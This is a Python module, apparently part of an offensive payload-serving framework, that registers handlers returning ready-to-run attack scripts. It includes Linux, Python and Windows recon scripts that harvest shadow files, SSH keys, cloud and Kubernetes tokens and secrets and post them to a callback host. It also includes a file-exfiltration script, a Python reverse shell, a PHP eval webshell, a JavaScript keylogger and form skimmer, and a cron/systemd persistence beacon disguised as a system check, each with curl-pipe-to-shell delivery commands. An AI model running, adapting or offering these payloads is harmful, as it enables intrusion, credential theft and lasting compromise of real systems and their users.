"""脚本文件 PoC"""
from ..base import poc, PocRequest, PocResponse


# ==================== 脚本模板（运行时用，__CB__ 由 handler 动态替换） ====================

_RECON_LINUX = """#!/bin/bash
CB="__CB__"
c(){ echo "=== $1 ==="; eval "$2" 2>/dev/null; echo; }
{
  c "System" "uname -a; cat /etc/os-release"
  c "User" "whoami; id; w"
  c "Network" "ip a || ifconfig; ss -tlnp || netstat -tlnp"
  c "DNS" "cat /etc/resolv.conf; cat /etc/hosts"
  c "Passwd" "cat /etc/passwd"
  c "Shadow" "cat /etc/shadow"
  c "SSH Keys" "ls -la ~/.ssh/; cat ~/.ssh/authorized_keys; cat ~/.ssh/id_rsa"
  c "Cron" "crontab -l; ls -la /etc/cron*"
  c "SUID" "find / -perm -4000 -type f 2>/dev/null | head -20"
  c "Process" "ps aux | head -40"
  c "Env" "env"
  c "History" "cat ~/.bash_history | tail -50"
  c "Docker" "docker ps; cat /proc/1/cgroup"
  c "K8s" "cat /var/run/secrets/kubernetes.io/serviceaccount/token; env | grep -i kube"
} | curl -s -X POST "$CB?_exfil=1&_type=recon" -d @-"""

_RECON_PYTHON = """#!/usr/bin/env python3
import os,sys,socket,platform,json,urllib.request,subprocess as sp
CB="__CB__"
def run(cmd):
    try: return sp.check_output(cmd,shell=True,stderr=sp.DEVNULL,timeout=10).decode(errors='replace')
    except: return ""
info={}
info["hostname"]=socket.gethostname()
info["platform"]=platform.platform()
info["arch"]=platform.machine()
info["user"]=os.getenv("USER") or os.getenv("USERNAME") or run("whoami").strip()
info["uid"]=run("id").strip()
info["cwd"]=os.getcwd()
info["pid"]=os.getpid()
info["python"]=sys.version
info["ip_internal"]=socket.gethostbyname(socket.gethostname())
info["env"]={k:v for k,v in os.environ.items() if any(x in k.upper() for x in ["KEY","SECRET","TOKEN","PASS","AWS","DB","API"])}
info["ifconfig"]=run("ip a 2>/dev/null || ifconfig 2>/dev/null")
info["passwd"]=run("cat /etc/passwd 2>/dev/null")
info["ps"]=run("ps aux 2>/dev/null | head -30")
info["home_files"]=run("ls -la ~ 2>/dev/null")
info["ssh_keys"]=run("ls -la ~/.ssh/ 2>/dev/null")
data=json.dumps(info,ensure_ascii=False,indent=2).encode()
req=urllib.request.Request(CB+"?_exfil=1&_type=recon",data=data,method="POST")
req.add_header("Content-Type","application/json")
try: urllib.request.urlopen(req,timeout=15)
except: pass"""

_RECON_WINDOWS = """$CB="__CB__"
$info=@{}
$info["hostname"]=$env:COMPUTERNAME
$info["user"]="$env:USERDOMAIN\\$env:USERNAME"
$info["os"]=(Get-CimInstance Win32_OperatingSystem).Caption
$info["arch"]=$env:PROCESSOR_ARCHITECTURE
$info["ip"]=(Get-NetIPAddress -AddressFamily IPv4 | Where {$_.IPAddress -ne "127.0.0.1"}).IPAddress -join ","
$info["domain"]=(Get-CimInstance Win32_ComputerSystem).Domain
$info["av"]=(Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct -EA 0).displayName -join ","
$info["ps"]=(Get-Process | Select -First 30 Name,Id,Path | ConvertTo-Json -Compress)
$info["services"]=(Get-Service | Where Status -eq Running | Select -First 20 Name | ConvertTo-Json -Compress)
$info["env"]=($env:Path)
$info["admins"]=(net localgroup administrators 2>$null) -join "`n"
$info["netstat"]=(netstat -an | Select -First 30) -join "`n"
$info["arp"]=(arp -a) -join "`n"
$info["installed"]=((Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*).DisplayName | Select -First 20) -join ","
$json=[System.Text.Encoding]::UTF8.GetBytes(($info|ConvertTo-Json -Compress))
try{IWR -Uri "$CB`?_exfil=1&_type=recon" -Method POST -Body $json -ContentType "application/json" -TimeoutSec 15}catch{}"""

_EXFIL_FILES = """#!/bin/bash
CB="__CB__"
TARGETS="/etc/passwd /etc/shadow /etc/hosts /etc/crontab"
TARGETS="$TARGETS $(find /home -name '.bash_history' -o -name '.env' -o -name 'id_rsa' -o -name '*.conf' 2>/dev/null | head -20)"
TARGETS="$TARGETS $(find /var/www -name '*.php' -o -name '*.env' -o -name 'config*' 2>/dev/null | head -20)"
TARGETS="$TARGETS $(find /opt /srv -name '*.yml' -o -name '*.yaml' -o -name '*.json' -o -name '.env' 2>/dev/null | head -20)"
for f in $TARGETS; do
  [ -r "$f" ] && {
    data=$(base64 -w0 "$f" 2>/dev/null || base64 "$f" 2>/dev/null)
    curl -s "$CB?_exfil=1&_type=file&filename=$(echo $f|base64 -w0)&_data=$data" -o /dev/null
    sleep 0.2
  }
done"""

_REVSHELL_PY = """#!/usr/bin/env python3
import socket,subprocess,os,pty,sys
HOST="__IP__"
PORT=__PORT__
try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((HOST,int(PORT)))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    pty.spawn("/bin/bash")
except:
    sys.exit(0)"""

_KEYLOGGER_JS = """(function(){var b="",u="__CB__";document.addEventListener("keypress",function(e){b+=e.key;if(b.length>=20){new Image().src=u+"?_exfil=1&_type=keylog&_data="+encodeURIComponent(b)+"&page="+encodeURIComponent(location.href);b=""}});document.addEventListener("submit",function(e){var d={};new FormData(e.target).forEach(function(v,k){d[k]=v});new Image().src=u+"?_exfil=1&_type=form&_data="+encodeURIComponent(JSON.stringify(d))})})();"""

_PERSIST_CRON = """#!/bin/bash
CB="__CB__"
PAYLOAD="curl -s $CB?_exfil=1&_type=beacon&_data=$(hostname)-$(whoami) > /dev/null 2>&1"
(crontab -l 2>/dev/null; echo "*/5 * * * * $PAYLOAD") | sort -u | crontab - 2>/dev/null
grep -q "$CB" ~/.bashrc 2>/dev/null || echo "$PAYLOAD" >> ~/.bashrc 2>/dev/null
if [ "$(id -u)" -eq 0 ]; then
cat > /etc/systemd/system/syscheck.service << 'SVC'
[Unit]
Description=System Check
[Service]
Type=oneshot
ExecStart=/bin/bash -c "PAYLOAD_CMD"
SVC
sed -i "s|PAYLOAD_CMD|$PAYLOAD|g" /etc/systemd/system/syscheck.service
cat > /etc/systemd/system/syscheck.timer << 'TMR'
[Unit]
Description=System Check Timer
[Timer]
OnBootSec=60
OnUnitActiveSec=300
[Install]
WantedBy=timers.target
TMR
systemctl daemon-reload && systemctl enable --now syscheck.timer 2>/dev/null
fi
$PAYLOAD"""


# ==================== Handler 注册 ====================

@poc(
    name="recon-linux",
    description="Linux 信息收集",
    category="script",
    content_type="text/plain",
    usage="curl -sL '{url}' | bash",
    response_body=_RECON_LINUX.replace("__CB__", "{{callback_url}}"),
    enable_variables=True,
    filename="recon.sh",
)
async def recon_linux(req: PocRequest) -> PocResponse:
    cb = req.query_params.get("cb") or req.base_url
    body = _RECON_LINUX.replace("__CB__", cb)
    return PocResponse(body=body, content_type="text/plain")


@poc(
    name="recon-python",
    description="Python 信息收集",
    category="script",
    content_type="text/plain",
    usage="curl -sL '{url}' | python3",
    response_body=_RECON_PYTHON.replace("__CB__", "{{callback_url}}"),
    enable_variables=True,
    filename="recon.py",
)
async def recon_python(req: PocRequest) -> PocResponse:
    cb = req.query_params.get("cb") or req.base_url
    body = _RECON_PYTHON.replace("__CB__", cb)
    return PocResponse(body=body, content_type="text/plain")


@poc(
    name="recon-windows",
    description="Windows 信息收集",
    category="script",
    content_type="text/plain",
    usage="powershell -ep bypass -c \"IEX(IWR '{url}')\"",
    response_body=_RECON_WINDOWS.replace("__CB__", "{{callback_url}}"),
    enable_variables=True,
    filename="recon.ps1",
)
async def recon_windows(req: PocRequest) -> PocResponse:
    cb = req.query_params.get("cb") or req.base_url
    body = _RECON_WINDOWS.replace("__CB__", cb)
    return PocResponse(body=body, content_type="text/plain")


@poc(
    name="exfil-files",
    description="批量文件外带",
    category="script",
    content_type="text/plain",
    usage="curl -sL '{url}' | bash",
    response_body=_EXFIL_FILES.replace("__CB__", "{{callback_url}}"),
    enable_variables=True,
    filename="exfil.sh",
)
async def exfil_files(req: PocRequest) -> PocResponse:
    cb = req.query_params.get("cb") or req.base_url
    body = _EXFIL_FILES.replace("__CB__", cb)
    return PocResponse(body=body, content_type="text/plain")


@poc(
    name="revshell-python",
    description="Python PTY 反弹 Shell",
    category="script",
    content_type="text/plain",
    usage="curl -sL '{url}?ip=IP&port=4444' | python3",
    response_body=_REVSHELL_PY.replace("__IP__", "{{attacker_ip}}").replace("__PORT__", "{{attacker_port}}"),
    enable_variables=True,
    filename="shell.py",
)
async def revshell_python(req: PocRequest) -> PocResponse:
    ip = req.query_params.get("ip", "ATTACKER_IP")
    port = req.query_params.get("port", "4444")
    body = _REVSHELL_PY.replace("__IP__", ip).replace("__PORT__", str(port))
    return PocResponse(body=body, content_type="text/plain")


@poc(
    name="webshell-php",
    description="PHP Webshell",
    category="script",
    content_type="application/x-httpd-php",
    response_body="<?php if(md5($_GET['k'])!=='YOUR_MD5_HASH'){die('404');}@eval($_POST['cmd']);?>",
    filename="shell.php",
)
async def webshell_php(req: PocRequest) -> PocResponse:
    keyhash = req.query_params.get("keyhash", "YOUR_MD5_HASH")
    body = "<?php if(md5($_GET['k'])!=='" + keyhash + "'){die('404');}@eval($_POST['cmd']);?>"
    return PocResponse(body=body, content_type="application/x-httpd-php")


@poc(
    name="keylogger-js",
    description="JS 键盘记录器",
    category="script",
    content_type="text/javascript",
    usage='<script src="{url}"></script>',
    response_body=_KEYLOGGER_JS.replace("__CB__", "{{callback_url}}"),
    enable_variables=True,
    filename="keylogger.js",
)
async def keylogger_js(req: PocRequest) -> PocResponse:
    cb = req.query_params.get("cb") or req.base_url
    body = _KEYLOGGER_JS.replace("__CB__", cb)
    return PocResponse(body=body, content_type="text/javascript")


@poc(
    name="persist-cron",
    description="Linux Cron 持久化",
    category="script",
    content_type="text/plain",
    usage="curl -sL '{url}' | bash",
    response_body=_PERSIST_CRON.replace("__CB__", "{{callback_url}}"),
    enable_variables=True,
    filename="persist.sh",
)
async def persist_cron(req: PocRequest) -> PocResponse:
    cb = req.query_params.get("cb") or req.base_url
    body = _PERSIST_CRON.replace("__CB__", cb)
    return PocResponse(body=body, content_type="text/plain")
